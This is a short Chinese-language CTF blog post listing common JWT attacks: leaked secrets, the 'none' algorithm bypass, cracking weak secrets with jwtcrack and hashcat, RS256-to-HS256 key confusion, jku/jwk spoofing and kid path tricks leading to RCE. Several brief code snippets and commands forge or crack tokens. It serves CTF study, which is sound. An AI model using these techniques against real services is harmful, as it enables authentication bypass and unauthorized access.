---
layout: post
title: "JWT常见攻击方法"
date: 2021-09-01 15:30:51 +0800
description: ""
category: ctf/web
tags: []
---

[JSON Web Token（JWT）](https://bbs.ichunqiu.com/thread-59943-1-1.html)不需要在服务端去保留用户的认证信息或者会话信息，利于分布式应用的扩展，且天然防御CSRF攻击。

在线解码：https://jwt.io/

JWT一共由三部分组成，分别为头部(header),载荷(payload)，签名(signature)。

头部：`{"alg": "HS256", "typ": "JWT"}`

载荷：`{ "sub": "1234567890", "name": "John Doe","iat": 1516239022}`

签名：将base64编码后的header与base64编码后的payload通过符号`.`相连，然后通过header中声明的加密方式进行加盐secret组合加密。JWT最终的结果会将原始的base64字符串中的`/`换成`_`。并且去掉原本base64中用于补位的`=`。可以用python的库中`base64.urlsafe_b64encode`替换`base64encode`。

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret
)
```

#### 密钥secret泄露

目录扫描，得到后缀为`.swp`的文件，恢复源码，源码中泄露JWT的密钥。

#### node的jsonwebtoken包存在漏洞，加密算法为none

```
payload = jwt.decode(jwtToken, verify=False)
jwt.encode(payload,None,algorithm=None)
```

#### 密钥secret复杂度较低，爆破

```
/mnt/hgfs/tools/web/c-jwt-cracker$./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.

hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
```

#### 将非对称加密修改为对称加密

RS256的签名流程是：`使用私钥对JWT签名，使用公钥验证JWT是否被篡改`

HS256的签名流程是：`使用密钥对JWT签名，使用同一个密钥验证JWT是否被篡改`

后台服务器使用`RS256`生成token，使用`HS256`替换`RS256`，结合公钥，绕过验证。

```
#后台代码，生成token
auth = jwt.encode({"auth": "guest"}, PRIVATE_KEY, algorithm="RS256")

#利用HS256代替RS256，需要注释掉Python27\Lib\site-packages\jwt\algorithms.py，注释第147至第151行
public = open('public.pem', 'r').read()
print(public)
print(jwt.encode({"data":"test"}, key=public, algorithm='HS256')).decode('utf-8')
```

#### [jku/jwk](jku/jwk)

JKU全称是`JWKSet URL`，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。

利用[mkjwk](https://mkjwk.org/)申请一组key，更改JKU为我们自己的json，用私钥加密payload，服务器端用我们的JKU中指定的公钥解密payload。

jwk就是json web key，直接修改此值，即修改公钥。

#### kid-任意文件

控制kid读取`/dev/null`为key，`/dev/null`能够丢弃一切写入其中的数据。而读取它将立即得到一个EOF。伪造一个有效token，包含我们恶意的python序列化内容，进行RCE。

#### 辅助工具

```sh
D:\ctf\tools\web\jwt_tool>python3 jwt_tool.py jwt
```

